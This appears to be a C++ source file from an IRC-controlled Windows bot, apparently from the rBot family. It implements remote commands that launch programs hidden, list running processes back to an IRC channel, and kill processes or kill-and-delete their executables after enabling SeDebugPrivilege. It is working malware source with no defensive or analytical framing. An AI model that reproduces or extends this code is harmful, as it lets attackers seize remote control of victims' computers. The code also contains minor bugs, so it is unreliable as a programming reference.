#include "includes.h"
#include "functions.h"

#ifndef NO_PROCESS

DWORD WINAPI CreateProcThread(LPVOID param)
{
	NTHREAD process = *((NTHREAD *)param);
	NTHREAD *processt = (NTHREAD *)param;
	processt->gotinfo = TRUE;
	IRC* irc=(IRC*)process.conn;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	BOOL hide=process.bdata1;
	BOOL wait=process.bdata2;
	char file[MAX_PATH];
	strcpy(file,process.data1);

	char path[MAX_PATH];
	strncpy(path,file,sizeof(path));
	if (!fPathRemoveFileSpec(path))
	{
		if (!process.silent)
			irc->privmsg(process.target,"%s Couldn't parse path, error: <%d>", process_title, GetLastError());
		return 1;
	}
	
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	si.cb=sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = (hide?SW_HIDE:SW_SHOW);

	if (!CreateProcess(NULL,file,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
	{
		if (!process.silent)
			irc->privmsg(process.target,"%s Failed to create process: \"%s\", error: <%d>", process_title, file, GetLastError());
		return 1;
	}
	else
	{
		DWORD start=GetTickCount();//record this before the privmsg so we arent off
		if (!process.silent)
			irc->privmsg(process.target,"%s Created process: \"%s\", PID: <%d>",process_title,file,pi.dwProcessId);
		
		if (!process.silent)
		{//no sense waiting if its silent
			if (wait)
			{
				WaitForSingleObject(pi.hProcess,INFINITE);
				DWORD stop=GetTickCount();
				char ttime[120],stime[120];
				stime[0]='\0';
				DWORD total = ((stop - start)/1000);
				DWORD hours = (total%86400)/3600;
				DWORD minutes = ((total%86400)%3600)/60;
				DWORD seconds = ((total%86400)%3600)%60;
				if (hours>0)
				{
					sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
					strcat(stime,ttime);
				}
				sprintf(ttime," %.2d:%.2d",minutes,seconds);
				strcat(stime,ttime);

				irc->privmsg(process.target,"%s Process Finished: \"%s\", Total Running Time: %s.", process_title,file,stime);
			}
		}
		if (pi.hProcess) CloseHandle(pi.hProcess);
		if (pi.hThread) CloseHandle(pi.hThread);
	}
	clearthread(process.threadnum);
	return 0;
}

// data1  = process to kill
// data2  = process to filter (for list)

// bdata1 = list
// bdata2 = kill
// bdata3 = del on kill
DWORD WINAPI ProcessThread(LPVOID param) 
{
	NTHREAD process = *((NTHREAD *)param);
	NTHREAD *processt = (NTHREAD *)param;
	processt->gotinfo = TRUE;

	IRC* irc=(IRC*)process.conn;
	char sendbuf[IRCLINE];
	//char target[128];
	//sprintf(target,process.hostd->target);
	//char *target=process.hostd->target;

	if (process.bdata1) // list
	{
		std::list<process_info> lProcesses;
		if(ListProcesses(&lProcesses,process.data2))
		{
			std::list<process_info>::iterator ip; int iCount=0;

			irc->privmsg(process.target,"%s Process List:",process_title);

			if (process.verbose)
				irc->privmsg(process.target," PID   - Mem Usage - Process");

			for(ip=lProcesses.begin(); ip!=lProcesses.end(); ++ip)
			{
				iCount++;
				char *processExe=(*ip).sProcessName;
				char *mUsage=(*ip).mUsage;
				unsigned long processPid=(*ip).lProcessPid;

				strcat(mUsage," K");
				sprintf(sendbuf," %-6d- %-10s- \"%s\"",processPid,mUsage,processExe);

				irc->privmsg(process.target,sendbuf);
			}
			//sprintf(sendbuf,"%s Displayed process list.",process_title);
			//addlog(MAINLOG,sendbuf);
			irc->privmsg(process.target,"%s End of list.",process_title);
		}
		else
		{
			irc->privmsg(process.target,"%s Unable to list processes, error: <%d>.",process_title,GetLastError());
			//addlog(ERRORLOG,sendbuf);
		}

	}
	else
	{
		if (process.bdata2) // kill
		{
			char procKilled[16];

			if (!process.bdata3) // delete
			{
				if (KillProcess(process.data1,procKilled))
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Process \"%s\" killed, total: <%s>.",process_title,process.data1,procKilled);
				}
				else if (KillPid(atoi(process.data1)))
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s PID \"%i\" killed.",process_title,atoi(process.data1));
				}
				else
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Failed to kill process.",process_title);
				}
			}
			else
			{
				char path[MAX_PATH];
				sprintf(path,"%s",ProcessPidToName(atoi(process.data1),path));

				char fname[_MAX_FNAME],ext[_MAX_EXT];
				_splitpath(path,0,0,fname,ext);
				strcat(fname,ext);
				
				BOOL success=FALSE;
				BOOL killed=FALSE;
				for (int t=0;t<5;t++)
				{
					if (KillPid(atoi(process.data1)))
						killed=TRUE;
					SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
					if (DeleteFile(path))
					{
						success=TRUE;
						break;
					}
					else
					{
						if (killed) //if we've killed the process id and cant erase 
							KillProcess(fname,0);//it maybe its running more than once
						Sleep(1000);
					}
				}
				if (success)
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s PID \"%i\" killed and deleted.",process_title,atoi(process.data1));
				}
				else
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Failed to kill and erase process.",process_title);
				}
			}
		}
	}
	clearthread(process.threadnum);
	return 0;
}

bool ListProcesses(std::list<process_info> *lProcesses, char *filter) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded))
		return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	for ( int i = 0; i < cProcesses; i++ ) {
	  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
		if (hProcess) {
			HMODULE hMod;
			PROCESS_MEMORY_COUNTERS pmc;
			DWORD cbNeeded;
			//char tempbuf[128];

			if (fEnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded)) {
				
				fGetModuleFileNameEx(hProcess,hMod,szProcessName,sizeof(szProcessName));

				process_info pInfo;
				sprintf(pInfo.sProcessName,"%s",szProcessName);
				pInfo.lProcessPid=aProcesses[i];

				if (fGetProcessMemoryInfo(hProcess,&pmc,sizeof(pmc))) {
					_snprintf(pInfo.mUsage,sizeof(pInfo.mUsage),"%s",commaI64((pmc.WorkingSetSize/1024)));
				} else
					_snprintf(pInfo.mUsage,sizeof(pInfo.mUsage),"Error: <%d>",GetLastError());

				if (filter)
				{
					char ext[_MAX_EXT],file[_MAX_FNAME+_MAX_EXT];
					_splitpath(pInfo.sProcessName, NULL, NULL, file, ext);
					strcat(file,ext);
					fprintf(stderr,"%s / %s\n",filter,file);
					if (!lstrcmpi(filter,file))
					{
						lProcesses->push_back(pInfo);
					}
				}
				else
					lProcesses->push_back(pInfo);
			}
			CloseHandle(hProcess);
		}
	}
	return TRUE;
}

bool KillProcess(const char *szProcName, char *procKilled) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	bool bRetVal=false;
	unsigned int i;
	HMODULE hMod;

	// Get SeDebugPrivileges
	TOKEN_PRIVILEGES tPriv, tPrivOld;
	DWORD cbPriv=sizeof(tPrivOld);
	HANDLE hToken;
	
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken) {
		tPriv.PrivilegeCount=1; tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv)) {
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED) {
				CloseHandle(hToken); hToken=NULL;
			}
		} else {
			CloseHandle(hToken);
			hToken=NULL;
		}
	}

	// Enumerate processes
	if(!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		return false;
	cProcesses=cbNeeded/sizeof(DWORD);

	unsigned int killed=0;
	for(i=0; i<cProcesses; i++) {
		char szProcessName[MAX_PATH];
		strcpy(szProcessName, "unknown");
		HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if(hProcess) {
			if(fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				for(int ipn=0;ipn<strlen(szProcessName);ipn++)
					*(szProcessName+i)=toupper(*(szProcessName+i));
				
				if(!szProcName) {
					bRetVal=false; // FIX ME: Could Kill all bot processes here
				}
				else { // Kill the named process
					if(!strcmp(szProcessName, szProcName)) {
						killed++;
						TerminateProcess(hProcess, 0);
						bRetVal=true;
					}
				}
			}
			CloseHandle(hProcess);
		}
	}

	if (procKilled)
		sprintf(procKilled,"%i",killed);
	
	// Drop SeDebugPrivileges
	if(hToken) {
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}

	return bRetVal;
}

BOOL GetDebugPrivs(HANDLE &hToken,TOKEN_PRIVILEGES &tPrivOld)
{
	TOKEN_PRIVILEGES tPriv;
	DWORD cbPriv=sizeof(tPrivOld);
	BOOL bRet=FALSE;
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken)
	{
		tPriv.PrivilegeCount=1;
		tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv))
		{
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED)
			{
				CloseHandle(hToken);
				hToken=NULL;
			}
			else
				bRet=TRUE;
		}
		else
		{
			CloseHandle(hToken);
			hToken=NULL;
		}
	}
	return bRet;
}
void DropDebugPrivs(HANDLE &hToken,TOKEN_PRIVILEGES &tPrivOld)
{
	// Drop SeDebugPrivileges
	if(hToken)
	{
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}
}

BOOL KillPid(unsigned long lPid)
{
	bool bRetVal=FALSE;

	/*
	// Get SeDebugPrivileges
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken) {
		tPriv.PrivilegeCount=1;
		tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv)) {
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED) {
				CloseHandle(hToken); hToken=NULL;
			}
		} else {
			CloseHandle(hToken); hToken=NULL;
		}
	}
	*/

	TOKEN_PRIVILEGES tPrivOld;
	HANDLE hToken;
	GetDebugPrivs(hToken,tPrivOld);

	HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,lPid);
	if(hProcess) {
		TerminateProcess(hProcess, 0);
		bRetVal=TRUE;
		CloseHandle(hProcess);
	}
	
	DropDebugPrivs(hToken,tPrivOld);

	/*
	// Drop SeDebugPrivileges
	if(hToken) {
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}
	*/

	return bRetVal;
}

PCHAR ProcessPidToName(DWORD ProcessId,PCHAR ProcessName) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded)) return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	strcpy(ProcessName,"???");

	for ( int i = 0; i < cProcesses; i++ )
	{
	  HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
		if ( hProcess )
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if ( fEnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
			{

				if (ProcessId == aProcesses[i]) {
					fGetModuleFileNameEx( hProcess, hMod, szProcessName,sizeof(szProcessName) );
					sprintf(ProcessName,"%s",szProcessName);
					return ProcessName;
				}
					
			
			}
			CloseHandle( hProcess );
		}
	}
	
	return ProcessName;
}
#endif
